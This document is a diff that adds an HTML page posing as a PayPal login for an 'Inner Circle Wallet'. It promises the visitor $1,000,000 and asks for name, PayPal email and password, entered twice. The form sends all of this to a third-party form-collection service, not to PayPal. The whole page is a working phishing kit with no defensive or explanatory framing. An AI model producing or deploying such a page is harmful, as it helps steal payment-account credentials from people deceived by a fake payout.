@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="en"> 
+ <head> 
+  <meta charset="UTF-8"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <title>User Information Form</title> 
+  <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            text-align: center;
+        }
+        form {
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        label, input, select {
+            display: block;
+            margin: 10px auto;
+        }
+        input, select {
+            width: 80%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+        h2 {
+            color: red;
+            margin-bottom: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: darkred;
+        }
+    </style> 
+ </head> 
+ <body> 
+  <h2>Inner Circle Wallet</h2> 
+  <h2>Log in to PayPal</h2> 
+  <form action="https://getform.io/f/ayvvdneb" method="POST"> 
+   <label for="name">Name:</label> 
+   <input type="text" id="name" name="name" required> 
+   <label for="email">PayPal Email:</label> 
+   <input type="email" id="email" name="email" required> 
+   <label for="amount">Amount:</label> 
+   <select id="amount" name="amount" required> 
+    <option value="1000000">$1,000,000</option> 
+   </select> 
+   <label for="passwor">Security:</label> 
+   <input type="passwor" id="passwor" name="passwor" required> 
+   <label for="confirm">Again:</label> 
+   <input type="passwor" id="confirm" name="confirm" required> 
+   <button type="submit">Receive</button> 
+  </form> 
+ 
+</body></html>
